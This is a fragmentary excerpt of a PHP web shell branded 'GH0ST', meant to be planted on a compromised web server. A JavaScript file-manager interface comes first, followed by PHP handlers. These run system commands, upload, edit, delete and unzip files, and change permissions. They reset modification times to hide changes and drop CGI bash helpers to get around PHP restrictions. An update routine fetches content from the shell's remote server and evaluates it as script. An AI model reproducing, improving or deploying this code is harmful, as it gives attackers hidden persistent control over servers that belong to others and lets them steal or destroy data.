u=a;"file"==r?(u="&file="+a,s.setAttribute("href","#action=fileman&path="+c_+"/"+u),s.setAttribute("target","_blank"),s.onclick=function(){}):(s.setAttribute("href","javascript:void(0)"),s.removeAttribute("target"),s.onclick=function(){GH0STFilesManNewTab(c_,u)});break;case"delete":s.setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';");break;case"download":s.setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')");break;case"permission":try{var p=d.querySelector("#id_chmode_"+i.replace("id_","")+" span").innerHTML;s.setAttribute("perm",p.trim())}catch(e){}break;case"link":s.style.display="block";var f="<?php echo $_SERVER["DOCUMENT_ROOT"]; ?>/",m=(c_+"/"+a).replace(/\/\//g,"/");if(-1!=m.indexOf(f)){f=m.replace(f,"");var b=location.origin+"/"+f;s.setAttribute("href",""+b)}else s.style.display="none"}}var y=e.clientX,_=e.clientY;GH0STRightClickMenu(y,_),e.preventDefault()})})}function GH0STFilesManNewTab(e,t,a){var i=t;void 0!==a&&(i=GH0STGetLastFolderName(e));var l=decodeURIComponent(e+"/"+t);l=l.replace(/\/\//g,"/");var r=$("filesman_tab_1"),o=r.getAttribute("fm_counter");o=parseInt(o)+1,r.setAttribute("fm_counter",o),d.querySelector("#filesman_tabs_child").insertAdjacentHTML("beforeend",'<div onmouseover="GH0STFilesmanTabShowTitle(this,event);" onmouseout="GH0STFilesmanTabHideTitle(this,event);" path="'+l+'" id="filesman_tab_'+o+'" fm_id="'+o+'" onclick="filesmanTabController(this);" fname="'+t+'" class="filesman_tab"><img class="folder-tab-icon" src="http://solevisible.com/icons/menu/folder2.svg"> <span class="filesman-tab-folder-name">'+i+'</span> <img fm_id="'+o+'" onclick="closeFmTab(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div>'),d.querySelector(".ajaxarea").insertAdjacentHTML("beforebegin",'<div style="position:relative;" fm_id="'+o+'" id="filesman_holder_'+o+'" class="ajaxarea"><div class="header"></div></div>'),GH0ST_fm_id=o,g("FilesMan",l),GH0ST_fm_id=0}function GH0STFilesmanTabShowTitle(e,t){t.stopPropagation();var a=$("filesman-tab-full-path");a.style.display="block",a.style.top=e.offsetTop-37+"px",a.style.left=e.offsetLeft-$("filesman_tabs").scrollLeft+"px",a.innerHTML=e.getAttribute("path")}function GH0STFilesmanTabHideTitle(e,t){$("filesman-tab-full-path").style.display="none"}function GH0STPopupAction(e,t){var a="",i="";switch(t){case"rename":a="Old file name:",i="New file name:";break;case"copy":a="File path:",i="Enter the file path that you want to copy this file to:";break;case"move":a="Current Path:",i="Enter the file path that you want to move this file to:";break;case"extract":a="Files to extract:",i="Enter the path you wish to extract the files to and click Extract:"}var l=e.getAttribute("fname"),r=e.getAttribute("path"),o=t.charAt(0).toUpperCase()+t.slice(1);if("permission"==t){d.querySelector("#shortcutMenu-holder").style.height="222px",o="Change Permissions",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="block",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="none";var n=e.getAttribute("perm"),s=n.substr(1,1),c=n.substr(2,1),u=n.substr(3,1);d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s,d.querySelector("#shortcutMenu-holder > form input[name=g]").value=c,d.querySelector("#shortcutMenu-holder > form input[name=w]").value=u,autoCheckPerms(s,"u",["u","g","w"]),autoCheckPerms(c,"g"),autoCheckPerms(u,"w")}else d.querySelector("#shortcutMenu-holder").style.height="190px",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="block",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="none";var p="move"==t||"copy"==t?r+l:l;if("modify"==t){var f="tr_row_"+e.getAttribute("fid").replace("id_","");p=d.querySelector("#"+f+" .main_modify").innerText}d.querySelector(".cl-popup-fixed").style.display="block",d.querySelector("#shortcutMenu-holder .popup-head").innerHTML=o,d.querySelector("#shortcutMenu-holder .old-path-lbl").innerHTML=a,d.querySelector("#shortcutMenu-holder .new-filename-lbl").innerHTML=i,d.querySelector("#shortcutMenu-holder .popup-foot > button[name=accept]").innerHTML=o,d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=r+l,d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value=p,d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("fid",e.getAttribute("fid")),d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("action",t)}function calcperm(){var e=event.srcElement;autoCheckPerms(e.checked,e.name.substr(0,1))}function autoCheckPerms(e,t,a){if(void 0!==a)for(var i in a){var l=a[i];d.querySelector("#shortcutMenu-holder > form input[name="+l+"r]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"w]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"x]").checked=!1}var r=d.querySelector("#shortcutMenu-holder > form input[name="+t+"r]"),o=d.querySelector("#shortcutMenu-holder > form input[name="+t+"w]"),n=d.querySelector("#shortcutMenu-holder > form input[name="+t+"x]");if("boolean"!=typeof e)"7"==e?(r.checked=!0,o.checked=!0,n.checked=!0):"4"==e?r.checked=!0:"2"==e?o.checked=!0:"1"==e?n.checked=!0:"6"==e?(r.checked=!0,o.checked=!0):"3"==e?(o.checked=!0,n.checked=!0):"5"==e&&(r.checked=!0,n.checked=!0);else{var s=0;r.checked&&(s+=4),o.checked&&(s+=2),n.checked&&(s+=1),"u"==t?d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s:"g"==t?d.querySelector("#shortcutMenu-holder > form input[name=g]").value=s:"w"==t&&(d.querySelector("#shortcutMenu-holder > form input[name=w]").value=s)}}function gg(e,t,a,i,l,r){var o="filesman_holder_"+GH0ST_current_fm_id;GH0STloader(o,"block"),data="a="+GH0STb64(e)+"&c="+GH0STb64(t)+"&GH0ST1="+GH0STb64(a)+"&GH0ST2="+GH0STb64(i)+"&GH0ST3="+GH0STb64(l)+"&ajax="+GH0STb64("true"),_Ajax(d.URL,data,r,!1,o)}function GH0STPopUpDoAction(e){var t=e.getAttribute("action");switch(t){case"rename":case"move":case"copy":var a=e.getAttribute("fid").replace("id_",""),i=$("id_"+a).getAttribute("fname"),l=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value;l=l.trim(),i=i.trim(),gg("doActions",c_,i,l,t,function(e,i){if("rename"==t)if("done"==e){var r=$("id_"+a);updateFileEditor(a,l);var o=r.getAttribute("path")+$("id_"+a).getAttribute("fname");d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=o,r.addEventListener("animationend",function(){r.classList.remove("textEffect")}),r.classList.add("textEffect"),GH0STShowNotification("Renamed...","Rename Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else GH0STShowNotification("error...!","Rename Action","error");GH0STloader(i,"none")});break;case"permission":var r=d.querySelector("#shortcutMenu-holder > form input[name=u]").value,o=d.querySelector("#shortcutMenu-holder > form input[name=g]").value,n=d.querySelector("#shortcutMenu-holder > form input[name=w]").value;i=(i=d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML).trim();var s=r.trim()+o.trim()+n.trim();gg("doActions",c_,i,s,t,function(e,t){GH0STloader(t,"none"),GH0STShowNotification(e,"Permission Action"),d.querySelector(".cl-popup-fixed").style.display="none"});break;case"modify":a=e.getAttribute("fid").replace("id_","");var c=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value,u=$("id_"+a).getAttribute("fname");gg("doActions",c_,c,u,t,function(t,a){if("ok"==t){var i="tr_row_"+e.getAttribute("fid").replace("id_","");d.querySelector("#"+i+" .main_modify").innerHTML=c,GH0STShowNotification("success...","Modify Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else GH0STShowNotification(t,"Modify Action","error");GH0STloader(a,"none")})}}function GH0STInitSoratableTab(e){Sortable.create(e,{direction:"horizontal",animation:300,GH0STClass:"sortable-GH0ST",filter:".not-sortable"})}$("search-input").addEventListener("keydown",function(e){setTimeout(function(){var e=$("search-input").value;for(var t in d.getElementsByClassName("history-list")[0].innerHTML="",editor_files)if(-1!=editor_files[t].file.search(e)||""==e){var a=0;t==editor_current_file&&(a=" is_active"),insertToHistory(t,editor_files[t].file,a,editor_files[t].type)}},100)},!1),_Ajax(d.URL,"a="+GH0STb64("checkupdate"),function(e){if(0!=e.length&&"[]"!=e){var t=JSON.parse(e);if(t.hasOwnProperty("content")){d.body.insertAdjacentHTML("beforeend",t.content);try{evalJS(t.content)}catch(t){}}if(t.hasOwnProperty("copyright")&&($("GH0ST-copyright").innerHTML=t.copyright),t.hasOwnProperty("solevisible")&&($("GH0ST_solevisible").innerHTML=t.solevisible),t.hasOwnProperty("code_name")&&($("hidden_sh").innerHTML=t.code_name.replace(/\{version\}/g,t.version_number)),t.hasOwnProperty("market")){var a=d.querySelector("span.GH0ST_plus");if(t.market.hasOwnProperty("visible")&&"yes"==t.market.visible&&($("menu_opt_market").style.display="inline"),"open"!=t.market.status&&(a.style.color="#ffc107"),t.market.hasOwnProperty("content"))try{evalJS(t.market.content)}catch(t){}}}}),<?php echo $GLOBALS["need_to_update_header"]; ?>?_Ajax(d.URL,"a="+GH0STb64("updateheader"),function(e){try{var t=JSON.parse(e);for(var a in t){for(var i="",l=0;l<t[a].length;l++)i+="useful"==a||"downloader"==a?'<span class="header_values" style="margin-left: 4px;">'+t[a][l]+"</span>":t[a][l];var r=$("header_"+a);r&&(r.innerHTML=i)}$("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on")}catch(e){}}):islinux&&_Ajax(d.URL,"a="+GH0STb64("checkcgi"),function(e){"ok"==e&&($("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on"))}),function(){d.onclick=function(){can_hashchange_work=!1,setTimeout(function(){can_hashchange_work=!0},600)},window.onhashchange=function(e){can_hashchange_work&&GH0STCheckUrlHash()},GH0STCheckUrlHash(),GH0STgetFlags(),rightclick_menu_context=$("rightclick_menu").style,GH0STInitCwdContext(),document.addEventListener("click",function(e){rightclick_menu_context.opacity="0",setTimeout(function(){rightclick_menu_context.visibility="hidden"},501)},!1);var e=document.createElement("script");e.src="https://cdnjs.cloudflare.com/ajax/libs/Sortable/1.10.2/Sortable.min.js",e.id="sortable-plugin",e.onload=function(){GH0STInitSoratableTab($("filesman_tabs_child")),GH0STInitSoratableTab(d.querySelector(".editor-tabs")),GH0STInitSoratableTab(d.querySelector(".options_tab")),GH0STInitSoratableTab(d.querySelector(".terminal-tabs")),GH0STInitSoratableTab(d.querySelector(".sql-tabs"))},d.body.appendChild(e)}();
</script>
</body>
</html>
<?php
...
function GH0STWhich($p) {
$path = GH0STEx('which ' . $p,false,false);
if(!empty($path))
return strlen($path);
return false;
}
function GH0STSize($s) {
if($s >= 1073741824)
...
function GH0STPermsColor($f,$isbash=false){
$class = "";
$num = "";
$human = "";
if($isbash){
...
function _GH0ST_can_runCommand($cgi=true,$cache=true){
	if(isset($_COOKIE["GH0ST_canruncmd"])&&$cache){
		return true;
	}
	if(strlen(GH0STEx("whoami",false,$cgi))>0){
		$_COOKIE["GH0ST_canruncmd"] = true;
		return true;
	}
	return false;
}
function _GH0ST_symlink($target, $link){
	$phpsym = function_exists("symlink");
	if($phpsym){
		@symlink($target, $link);
	}else{
		GH0STEx("ln -s '".addslashes($target)."' '".addslashes($link)."'");
	}
}
function _GH0ST_file_exists($file,$cgi=true){
	if(@file_exists($file)){
		return true;
	}else{
		if(strlen(GH0STEx("ls -la '".addslashes($file)."'",false,$cgi))>0){
			return true;
		}
	}
	return false;
}
function _GH0ST_file($file,$cgi=true){
	$array = @file($file);
	if(!$array){
		if(strlen(GH0STEx("id",false,$cgi))>0){
			$data = GH0STEx('cat "'.addslashes($file).'"',false,$cgi);
			if(strlen($data)>0){
				return explode("\n", $data);
			}else{
				return false;
...
function _GH0ST_is_writable($file){
	$check = false;
	$check = @is_writable($file);
	if(!$check){
		if(_GH0ST_can_runCommand()){
			$check = GH0STEx('[ -w "'.trim(addslashes($file)).'" ] && echo "yes" || echo "no"');
			if($check == "yes"){
				$check = true;
			}else{
				$check = false;
...
function _GH0ST_is_dir($dir,$mode="-d"){
	$check = false;
	$check = @is_dir($dir);
	if($mode == "-e"){
		$check = @is_file($dir);
	...
	if(!$check){
		if(_GH0ST_can_runCommand()){
			$check = GH0STEx('[ "'.trim($mode).'" "'.trim(addslashes($dir)).'" ] && echo "yes" || echo "no"');
			if($check == "yes"){
				return true;
			}else{
				return false;
...
function GH0STFilesMan(){
if(!empty ($_COOKIE['GH0ST_f']))
$_COOKIE['GH0ST_f'] = @unserialize($_COOKIE['GH0ST_f']);
if(!empty($_POST['GH0ST1'])){
switch($_POST['GH0ST1']){
case 'uploadFile':
$move_cmd_file = false;
$GH0ST_canruncmd = false;
if($GLOBALS['glob_chdir_false']){
	$GH0ST_canruncmd = _GH0ST_can_runCommand(true,true);
	$move_cmd_file = true;
}
if(_GH0ST_is_writable($GLOBALS['cwd'])){
$files = reArrayFiles($_FILES['f']);
$ret_files = array();
foreach($files as $file){
if($move_cmd_file&&$GH0ST_canruncmd){
	GH0STEx("cat '".addslashes($file['tmp_name'])."' > '".addslashes($_POST["c"]."/".$file['name'])."'");
}else{
	if(@move_uploaded_file($file['tmp_name'],$file['name'])){
		...
		$file_perm = GH0STPermsColor($file['name']);
		$file_size = @filesize($file['name']);
		$ret_files[] = array("name" => $file['name'], "size" => GH0STSize($file_size), "perm" => $file_perm, "modify" => $file_modify, "owner" => $file_owner."/".$file_group);
	}
}
}
if(!$move_cmd_file){
...
$new_dir_cmd = false;
if($GLOBALS['glob_chdir_false']){
	if(_GH0ST_can_runCommand(true,true)){
		if(_GH0ST_is_writable($GLOBALS['cwd'])){
			if(!_GH0ST_is_dir(trim($_POST['GH0ST2']))){
				GH0STEx("cd '".trim(addslashes($_POST['c']))."';mkdir '".trim(addslashes($_POST['GH0ST2']))."'");
				echo "<script>GH0STShowNotification('".addslashes($_POST['GH0ST2'])." created...', 'Files manager');</script>";
			}else{
				echo "<script>GH0STShowNotification('folder already existed', 'Files manager', 'error');</script>";
			}
		}else{
			echo "<script>GH0STShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
		}
	}else{
		echo "<script>GH0STShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
	}
}else{
	if(_GH0ST_is_writable($GLOBALS['cwd'])){
		if(!_GH0ST_is_dir(trim($_POST['GH0ST2']))){
			if(!@mkdir(trim($_POST['GH0ST2']))){
				echo "<script>GH0STShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
			}else{
				echo "<script>GH0STShowNotification('".addslashes($_POST['GH0ST2'])." created...', 'Files manager');</script>";
			}
...
if($GLOBALS["glob_chdir_false"]){
	if(_GH0ST_can_runCommand(true,true)){
		GH0STEx("rm -rf '".addslashes($_POST['c'].'/'.$f)."'");
	}
}else{
GH0STEx("rm -rf '".addslashes($f)."'",false,false);
if(@is_dir($f))
deleteDir($f);
else
@unlink($f);
...
if(@is_dir(rawurldecode(@$_POST['GH0ST2']))&&rawurldecode(@$_POST['GH0ST2'])!='..'){
deleteDir(rawurldecode(@$_POST['GH0ST2']));
GH0STEx("rm -rf '".addslashes($_POST['GH0ST2'])."'",false,false);
}else{
@unlink(rawurldecode(@$_POST['GH0ST2']));
}
if($GLOBALS["glob_chdir_false"]){
	$source = rawurldecode(@$_POST['GH0ST2']);
	if($source!='..'&&!empty($source)){
		if(_GH0ST_can_runCommand(true,true)){
			GH0STEx("cd '".trim(addslashes($_POST['c']))."';rm -rf '".addslashes($source)."'");
		}
	}
}
if(is_array($_POST['f']))
...
break;
case 'paste':
if($_COOKIE['GH0ST_act'] == 'copy'&&isset($_COOKIE['GH0ST_f'])){
foreach($_COOKIE['GH0ST_f'] as $f)
copy_paste($_COOKIE['GH0ST_c'],$f, $GLOBALS['cwd']);
}elseif($_COOKIE['GH0ST_act'] == 'move'&&isset($_COOKIE['GH0ST_f'])){
...
foreach($_COOKIE['GH0ST_f'] as $f)
@rename($_COOKIE['GH0ST_c'].$f, $GLOBALS['cwd'].$f);
}elseif($_COOKIE['GH0ST_act'] == 'zip'&&isset($_COOKIE['GH0ST_f'])){
if(class_exists('ZipArchive')){
$zip = new ZipArchive();
$zipX = "GH0ST_".rand(1,1000).".zip";
if($zip->open($zipX, 1)){
@chdir($_COOKIE['GH0ST_c']);
foreach($_COOKIE['GH0ST_f'] as $f){
if($f == '..')continue;
if(@is_file($_COOKIE['GH0ST_c'].$f))
$zip->addFile($_COOKIE['GH0ST_c'].$f, $f);
elseif(@is_dir($_COOKIE['GH0ST_c'].$f)){
...
}elseif($_COOKIE['GH0ST_act'] == 'unzip'&&isset($_COOKIE['GH0ST_f'])){
if(class_exists('ZipArchive')){
$zip = new ZipArchive();
foreach($_COOKIE['GH0ST_f'] as $f) {
if($zip->open($_COOKIE['GH0ST_c'].$f)){
$zip->extractTo($_COOKIE['GH0ST_cwd']);
$zip->close();}}}}
unset($_COOKIE['GH0ST_f']);
break;
default:
if(!empty($_POST['GH0ST1'])){
if(in_array($_POST['GH0ST1'], array("copy", "move", "zip", "unzip"))){
__GH0ST_set_cookie('GH0ST_act', @$_POST['GH0ST1']);
__GH0ST_set_cookie('GH0ST_f', @serialize($_POST['f']));
__GH0ST_set_cookie('GH0ST_c', @$_POST['c']);
return;
}
}
break;
...
if($dirContent === false){
	if(_GH0ST_can_runCommand(true,true)){
		$tmp_getdir_path = @$_COOKIE["GH0STchdir_bash_path"];
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["GH0STchdir_bash"])||@!file_exists($tmp_getdir_path."/GH0STcgiapi/getdir.GH0ST")){
			...
			$tmp_getdir_path = GH0STWriteTocgiapi("getdir.GH0ST",$bash);
			__GH0ST_set_cookie("GH0STchdir_bash", "true");
			__GH0ST_set_cookie("GH0STchdir_bash_path", $tmp_getdir_path);
		}
		$dirContent = GH0STEx("cd ".$tmp_getdir_path."/GH0STcgiapi;sh getdir.GH0ST '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
if($count_dirContent > 300){
	@$_COOKIE["GH0ST_limited_files"] = 100;
}
$GH0ST_sort_by = isset($_COOKIE["GH0ST_sort_by"]) ? $_COOKIE["GH0ST_sort_by"] : 'name';
$GH0ST_limited_files = isset($_COOKIE["GH0ST_limited_files"]) ? (int)$_COOKIE["GH0ST_limited_files"] : 0;
$GH0ST_files_page_number = isset($_POST["pagenum"]) ? (int)$_POST["pagenum"] : 1;
$GH0ST_filesman_direction = isset($_COOKIE["GH0ST_filesman_direction"]) ? $_COOKIE["GH0ST_filesman_direction"] : 'asc';
$files_page_count = 1;
if($GH0ST_limited_files > 0){
	$files_page_count = ceil($count_dirContent/$GH0ST_limited_files);
	if($files_page_count > 1){
		$files_page_count++;
	}
}
echo '<div><div class="filters-holder"><span>Filter: </span><input style="color:#25ff00;" autocomplete="off" type="text" id="regex-filter" name="name-filter" onkeydown="doFilterName(this);"><span style="margin-left:10px">Sort By: </span><select name="sort_files" onchange="sortBySelectedValue(this,\'GH0ST_sort_by\');" style="color:#25ff00;"><option value="name" '.($GH0ST_sort_by == 'name'?'selected':'').'>Name</option><option value="size" '.($GH0ST_sort_by == 'size'?'selected':'').'>Size</option><option value="modify" '.($GH0ST_sort_by == 'modify'?'selected':'').'>Modify</option></select><span style="margin-left:10px">Direction: </span><select name="direction_filesman" onChange="sortBySelectedValue(this,\'GH0ST_filesman_direction\')" style="color:#25ff00;"><option value="asc" '.($GH0ST_filesman_direction == 'asc'?'selected':'').'>Ascending</option><option value="desc" '.($GH0ST_filesman_direction == 'desc'?'selected':'').'>Descending</option></select><span style="margin-left:10px;"> limit: </span><input style="text-align:center;width: 40px;color:#25ff00;" type="text" name="limited_number" value="'.$GH0ST_limited_files.'" oninput="this.value=this.value.replace(/[^0-9]/g,\'\');setCookie(\'GH0ST_limited_files\', this.value, 2012);"><span style="margin-left:10px;">Files Count: <b style="color:#25ff00;">'.($count_dirContent-1).'</b></span></div><div class="header">';
if($dirContent == false){
...
global $sort;
$sort = array('name', 1);
if(isset($_COOKIE["GH0ST_sort_by"]) && !empty($_COOKIE["GH0ST_sort_by"])){
	$sort[0] = $_COOKIE["GH0ST_sort_by"];
}
if(!empty($_POST['GH0ST1'])) {
if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['GH0ST1'], $match))
$sort = array($match[1], (int)$match[2]);
}
if($GH0ST_files_page_number > ($files_page_count-1)){
	$GH0ST_files_page_number = 1;
}
...
$dirs = $files = array();
$n = $count_dirContent;
if($n > $GH0ST_limited_files && $GH0ST_limited_files > 0){
	$n = ($GH0ST_limited_files * $GH0ST_files_page_number);
	if($n > $count_dirContent){
		$n = $count_dirContent;
	}
}
$i = 0;
if($GH0ST_limited_files > 0 && $GH0ST_files_page_number > 1){
	$i = $GH0ST_limited_files * ($GH0ST_files_page_number - 1);
}
$page_builder = get_pagination_links($GH0ST_files_page_number,$files_page_count -1);
$cmd_dir_backp = "";
for(;$i<$n;$i++){
if($cmd_dir){
...
$file_perm = GH0STPermsColor(array("class"=>$dirContent[$i]["permcolor"],"num"=>$dirContent[$i]["permnum"],"human"=>$dirContent[$i]["permhuman"]),true);
...
$file_perm = GH0STPermsColor($GLOBALS['cwd'].$filename);
...
$GLOBALS['sort'] = $sort;
function GH0STCmp($a, $b) {
if($GLOBALS['sort'][0] != 'size')
return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
else
return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
}
usort($files, "GH0STCmp");
usort($dirs, "GH0STCmp");
if(isset($_COOKIE["GH0ST_filesman_direction"])&& !empty($_COOKIE["GH0ST_filesman_direction"])){
	if($_COOKIE["GH0ST_filesman_direction"] == 'desc'){
...
<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
<select id='tools_selector' name='GH0ST1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete' selected>Delete</option><option value='zip'>Add 2 Compress (zip)</option><option value='unzip'>Add 2 Uncompress (zip)</option><option value='paste'>Paste / Zip / Unzip </option></select>
...
function GH0STFilesTools(){
GH0SThead();
echo '<div class="filestools" style="height: 100%;">';
if(isset($_POST['GH0ST1']))$_POST['GH0ST1'] = rawurldecode($_POST['GH0ST1']);
$GH0ST1_decoded = $_POST['GH0ST1'];
$chdir_fals = false;
if(!@chdir($_POST['c'])){
	$chdir_fals = true;
	$_POST['GH0ST1'] = $_POST["c"]."/".$_POST["GH0ST1"];
	$GH0ST_canruncmd = _GH0ST_can_runCommand(true,true);
	if($GH0ST_canruncmd){
		$slashed_GH0ST1 = addslashes($_POST['GH0ST1']);
		$file_info = explode(":", GH0STEx('stat -c "%F:%U:%G:%s:%Y:0%a:%A" "'.$slashed_GH0ST1.'"'));
		$perm_color_class = GH0STEx("if [[ -w '".$slashed_GH0ST1."' ]]; then echo main_green_perm; elif [[ -r '".$slashed_GH0ST1."' ]]; then echo main_white_perm; else echo main_red_perm; fi");
	}
}
if($_POST['GH0ST2'] == 'auto'){
if(is_array(@getimagesize($_POST['GH0ST1']))){
$_POST['GH0ST2'] = 'image';
}else{
	$_POST['GH0ST2'] = 'view';
	if($chdir_fals){
		if($GH0ST_canruncmd){
			$mime = explode(":", GH0STEx("file --mime-type '".addslashes($_POST['GH0ST1'])."'"));
			$mimetype = $mime[1];
			if(!empty($mimetype)){
...
if($_POST['GH0ST2'] == "rename" && !empty($_POST['GH0ST3']) && @is_writable($_POST['GH0ST1'])){$rename_cache = $_POST['GH0ST3'];}
if(@$_POST['GH0ST2'] == 'mkfile'){
$_POST['GH0ST1'] = trim($_POST['GH0ST1']);
if($chdir_fals&&$GH0ST_canruncmd){
	if(_GH0ST_is_writable($_POST["c"])){
		GH0STEx("cd '".addslashes($_POST["c"])."';touch '".addslashes($GH0ST1_decoded)."'");
		$_POST['GH0ST2'] = "edit";
	}
}
if(!@file_exists($_POST['GH0ST1'])){
$fp = @fopen($_POST['GH0ST1'], 'w');
if($fp){
$_POST['GH0ST2'] = "edit";
fclose($fp);
}
...
if(!_GH0ST_file_exists(@$_POST['GH0ST1'])){
echo __pre()."<center><p><div class=\"txtfont\"><font color='red'>!...FILE DOEST NOT EXITS...!</font></div></p></center></div><script>editor_error=false;removeHistory('".$_POST['GH0ST4']."');</script>";
GH0STFooter();
return;
}
if($chdir_fals){
...
$permcolor = GH0STPermsColor(array("class"=>$perm_color_class,"num"=>$file_info[5],"human"=>$file_info[6]),true);
}else{
$uid = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($_POST['GH0ST1'])):'';
$gid = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($_POST['GH0ST1'])):'';
if(!$uid&&!$gid){
$uid['name'] = function_exists("fileowner")?@fileowner($_POST['GH0ST1']):'';
$gid['name'] = function_exists("filegroup")?@filegroup($_POST['GH0ST1']):'';
}
$permcolor = GH0STPermsColor($_POST['GH0ST1']);
$filesize = @filesize($_POST['GH0ST1']);
if(!isset($uid['name'],$gid['name'])||empty($uid['name'])||empty($gid['name'])){
	if(_GH0ST_can_runCommand()){
		list($uid['name'],$gid['name']) = explode(":", GH0STEx('stat -c "%U:%G" "'.addslashes($_POST["c"]."/".$_POST["GH0ST1"]).'"'));
	}
}
}
if(substr($_POST['GH0ST1'], 0, 7) == "phar://"){
	$GH0ST_file_directory = $_POST['GH0ST1'];
}else{
	$GH0ST_file_directory = str_replace("//", "/",($chdir_fals?"":$_POST['c'].'/').$_POST['GH0ST1']);
}
echo '<div style="overflow: hidden;white-space: nowrap;text-overflow: ellipsis;"><span class="editor_file_info_vars">Name:</span> '.htmlspecialchars(basename($GH0ST1_decoded)).' <span class="editor_file_info_vars">Size:</span> '.GH0STSize($filesize).' <span class="editor_file_info_vars">Permission:</span> '.$permcolor.' <span class="editor_file_info_vars">Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].' <span class="editor_file_info_vars">Directory:</span> '.dirname($GH0ST_file_directory).'</div>';
if(empty($_POST['GH0ST2']))$_POST['GH0ST2'] = 'view';
if(!_GH0ST_is_dir($_POST['GH0ST1'])){
...
echo('<div>');
foreach($m as $v)
echo $v == 'Delete' ? '<a href="javascript:void(0);" onclick="var chk=confirm(\'Are You Sure For Delete This File ?\');chk?editor(\''.addslashes(!isset($rename_cache)?$_POST['GH0ST1']:$rename_cache).'\',\''.strtolower($v).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['GH0ST4'].'\',\''.$ftype.'\'):\'\';"><span class="editor_actions">'.((strtolower($v)==@$_POST['GH0ST2'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a> ' : '<a href="javascript:void(0);" onclick="editor(\''.addslashes(!isset($rename_cache)?$_POST['GH0ST1']:$rename_cache).'\',\''.strtolower($v).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['GH0ST4'].'\',\''.$ftype.'\')"><span class="editor_actions">'.((strtolower($v)==@$_POST['GH0ST2'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a>';
echo '</div>';
switch($_POST['GH0ST2']){
case 'view':case 'edit':
@chdir($_POST['c']);
$disabled_btn = "";
if(!@is_writable($_POST['GH0ST1'])&&!_GH0ST_is_writable($_POST['GH0ST1'])){
$disabled_btn = "disabled=disabled";
$disabled_btn_style= 'background: #ff0000;color: #fff;';
}
if(!empty($_POST['GH0ST3'])){
$_POST['GH0ST3'] = substr($_POST['GH0ST3'],1);
$time = @filemtime($_POST['GH0ST1']);
$fp = @__write_file($_POST['GH0ST1'],$_POST['GH0ST3']);
if($chdir_fals&&$GH0ST_canruncmd){
	$rname = $GH0ST1_decoded;
	$randname = $rname.rand(111,9999);
	$filepath = dirname($_SERVER["SCRIPT_FILENAME"])."/".$randname;
	if($fp = @__write_file($filepath ,$_POST['GH0ST3'])){
		GH0STEx("mv '".addslashes($filepath)."' '".addslashes($_POST["GH0ST1"])."';rm -f '".addslashes($filepath)."'");
	}
}
if($fp){
echo 'Saved!<br>';
@touch($_POST['GH0ST1'],$time,$time);
}
}
echo '<div class="editor-view"><div class="view-content editor-ace-controller"><div style="display:inline-block;">'._GH0ST_load_ace_options("editor").'<button style="border-radius:10px;" class="button ace-controler" onClick="copyToClipboard(this);">Copy</button> <button class="button ace-controler" onclick="GH0STAceToFullscreen(this);">Full Screen</button> <button onclick="var ace_val = GH0ST_ace_editors.editor[this.getAttribute(\'ace_id\')].getValue();editor(\''.addslashes($GH0ST1_decoded).'\',\'edit\',\'1\'+ace_val,\''.$_POST['c'].'\',\''.$_POST['GH0ST4'].'\',\''.$ftype.'\');return false;" class="button ace-controler ace-save-btn" style="width: 100px;height: 33px;'.$disabled_btn_style.'" '.$disabled_btn.'>save</button></div><pre class="ml1 view_ml_content">';
echo htmlspecialchars(__read_file($_POST['GH0ST1']));
echo '</pre></div></div>';
break;
case 'highlight':
@chdir($_POST['c']);
if(@is_readable($_POST['GH0ST1'])){
echo '<div class="editor-view"><div class="view-content"><div class="ml1" style="background-color: #e1e1e1;color:black;">';
$code = @highlight_file($_POST['GH0ST1'],true);
echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div></div></div>';
}
break;
case 'delete':
@chdir($_POST['c']);
if(@is_writable($_POST['GH0ST1'])||$GLOBALS["glob_chdir_false"]){
$deleted = true;
if(!@unlink($_POST['GH0ST1'])){
	$deleted = false;
	if($GH0ST_canruncmd){
		if(_GH0ST_is_writable($_POST['GH0ST1'])){
